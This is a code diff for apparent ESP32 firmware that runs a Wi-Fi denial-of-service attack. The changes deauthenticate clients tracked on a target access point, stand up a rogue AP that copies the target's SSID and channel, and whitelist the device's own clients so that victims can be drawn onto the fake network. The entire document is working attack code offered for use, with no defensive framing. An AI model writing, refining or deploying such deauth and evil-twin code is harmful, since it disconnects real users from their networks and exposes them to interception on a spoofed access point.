@@ -21,7 +21,9 @@ static const char* TAG = "WIFI_HANDLER";
 static esp_timer_handle_t deauth_timer_handle;
 
 static void timer_send_deauth_frame(void *arg){
-    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
+    const wifi_ap_record_t *aprec = (const wifi_ap_record_t *) arg;
+    // Deauth tracked clients only
+    wifictl_deauth_tracked_clients(aprec->bssid);
 }
 
 // Your STA credentials
@@ -40,24 +42,38 @@ struct HotspotConfig g_hotspotConfig = {
     .authString = "WPA2-PSK",
     .password = "12345678"
 };
-
 static void wifi_event_handler(void* arg, esp_event_base_t event_base,
                                int32_t event_id, void* event_data)
 {
     if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
         esp_wifi_connect();
         ESP_LOGI(TAG, "STA mode started, connecting to %s...", sta_ssid);
-    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
+        return;
+    }
+
+    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
         ESP_LOGI(TAG, "Disconnected from STA network. Retrying...");
         esp_wifi_connect(); // Reconnect
-    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
+        return;
+    }
+
+    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
         wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data;
-        ESP_LOGI(TAG, "Station " MACSTR " joined, AID=%d",
+        ESP_LOGI(TAG, "Station " MACSTR " joined (our AP), AID=%d",
                  MAC2STR(event->mac), event->aid);
-    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) {
+        // Whitelist any station that connects to our AP so we don't deauth it.
+        wifictl_whitelist_mac(event->mac);
+        wifictl_untrack_client(event->mac);
+        return;
+    }
+
+    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) {
         wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data;
-        ESP_LOGI(TAG, "Station " MACSTR " left, AID=%d",
+        ESP_LOGI(TAG, "Station " MACSTR " left (our AP), AID=%d",
                  MAC2STR(event->mac), event->aid);
+        // Remove from whitelist so the sniffer/tracker can later track it if needed
+        wifictl_remove_whitelist_mac(event->mac);
+        return;
     }
 }
 
@@ -89,14 +105,15 @@ void attack_method_broadcast_stop(){
 
 void attack_method_rogueap(const wifi_ap_record_t *ap_record){
     ESP_LOGD(TAG, "Configuring Rogue AP");
-    wifictl_set_ap_mac(ap_record->bssid);
+    // Do not clone target BSSID. Keep our AP MAC distinct so deauth frames
+    // addressed to the target BSSID won't affect clients on our rogue AP.
     wifi_config_t ap_config = {
         .ap = {
             .ssid_len = strlen((char *)ap_record->ssid),
             .channel = ap_record->primary,
             .authmode = ap_record->authmode,
             .password = "dummypassword",
-            .max_connection = 1
+            .max_connection = 4
         },
     };
     mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
@@ -109,6 +126,10 @@ void attack_dos_start(attack_config_t *attack_config) {
     ESP_LOGI(TAG, "Starting DoS attack...");
     method = attack_config->method;
     ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
+            // Ensure we are on the target channel and not being pulled by STA.
+            // Temporarily disconnect STA so AP/sniffer can lock to target channel reliably.
+            esp_wifi_disconnect();
+            // Start rogue AP cloned onto target channel.
             attack_method_rogueap(attack_config->ap_record);
             attack_method_broadcast(attack_config->ap_record, 1);
 }
@@ -116,10 +137,18 @@ void attack_dos_start(attack_config_t *attack_config) {
 
 void attack_dos_stop() {
     attack_method_broadcast_stop();
+
+    // stop sniffer and clear tracked clients + target atomically
+    wifictl_stop_sniffer_and_clear_target();
+
     // wifictl_mgmt_ap_start();
-    //         wifictl_restore_ap_mac();
+    // wifictl_restore_ap_mac();
     ESP_LOGI(TAG, "DoS attack stopped");
+
+    // Reconnect STA back to previously configured network
+    esp_wifi_connect();
 }
+
 
 static void handle_deauth_request(void *handler_arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
 {
@@ -173,6 +202,8 @@ attack_config.ap_record = aprec;
     ESP_LOGI(TAG, "Target SSID: %s  channel: %d  auth: %d",
              attack_config.ap_record->ssid, attack_config.ap_record->primary, attack_config.ap_record->authmode);
 
+    wifictl_set_target_bssid(aprec->bssid);                // store bssid for tracker
+    wifictl_sniffer_start(aprec->primary);   
     attack_dos_start(&attack_config);
 
     ESP_LOGI(TAG, "--- DEAUTH REQUEST HANDLED ---");
